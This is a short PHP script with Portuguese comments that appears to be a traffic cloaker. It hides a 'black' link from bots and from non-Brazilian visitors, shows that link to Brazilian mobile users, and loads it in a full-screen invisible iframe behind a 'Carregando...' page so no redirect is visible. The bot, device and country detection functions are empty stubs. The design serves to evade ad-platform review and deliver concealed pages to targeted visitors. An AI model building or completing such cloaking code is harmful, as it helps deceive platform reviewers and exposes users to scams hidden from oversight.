<?php
$urlFinal = $_GET['url'] ?? '';

// Aqui você buscaria os links white e black associados a esta urlFinal
// do seu banco de dados ou sistema de armazenamento

// Simulando a busca
$linkWhite = 'https://exemplo.com/white';
$linkBlack = 'https://exemplo.com/black';

function is_bot() {
    // Sua lógica de detecção de bot aqui
}

function is_mobile() {
    // Sua lógica de detecção de dispositivo móvel aqui
}

function get_visitor_country() {
    // Sua lógica de detecção de país aqui
}

if (is_bot() || get_visitor_country() !== 'BR') {
    $target_link = $linkWhite;
} elseif (is_mobile()) {
    $target_link = $linkBlack;
} else {
    $target_link = $linkWhite;
}

// Renderiza a página sem redirecionamento visível
?>
<!DOCTYPE html>
<html>
<head>
    <title>Carregando...</title>
</head>
<body>
    <iframe src="<?php echo $target_link; ?>" style="position:fixed; top:0; left:0; bottom:0; right:0; width:100%; height:100%; border:none; margin:0; padding:0; overflow:hidden; z-index:999999;">
    </iframe>
</body>
</html>